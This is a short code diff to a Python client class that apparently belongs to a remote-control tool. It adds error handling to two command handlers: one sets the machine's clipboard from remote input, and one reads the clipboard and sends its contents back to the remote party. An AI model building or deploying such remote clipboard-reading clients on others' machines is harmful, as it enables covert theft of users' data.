@@ -323,8 +323,13 @@ class Client(object):
                 continue
 
             if data[0] == '--c':
-                pyperclip.copy(data[1])
-                self.send(b'<READY>')
+                try:
+                    pyperclip.copy(data[1])
+                    self.send(b'Copied Successfully')
+                except Exception as e:
+                    error_class = e.__class__.__name__
+                    detail = e.args[0]
+                    self.send('{0}: {1}'.format(error_class, detail).encode())
                 continue
 
             if data[0] == '--u':
@@ -385,7 +390,12 @@ class Client(object):
                 continue
 
             if data[0] == '--p':
-                self.send(pyperclip.paste().encode())
+                try:
+                    self.send(pyperclip.paste().encode())
+                except Exception as e:
+                    error_class = e.__class__.__name__
+                    detail = e.args[0]
+                    self.send('{0}: {1}'.format(error_class, detail).encode())
                 continue
 
             if data[0] == '--r':
